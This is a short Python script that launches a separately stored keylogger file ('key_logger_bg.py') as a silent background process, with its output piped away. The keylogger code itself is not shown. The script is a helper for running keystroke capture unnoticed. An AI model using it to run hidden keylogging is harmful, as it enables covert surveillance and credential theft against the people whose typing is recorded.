import os
import subprocess

# Replace with the appropriate path to your python executable
python_path = '/usr/bin/python3'

# Replace with the appropriate path to your keylogger script
keylogger_path = '/home/gmhua/Documents/python/keylogger/key_logger_bg.py'

# Execute the keylogger script in the background
subprocess.Popen([python_path, keylogger_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

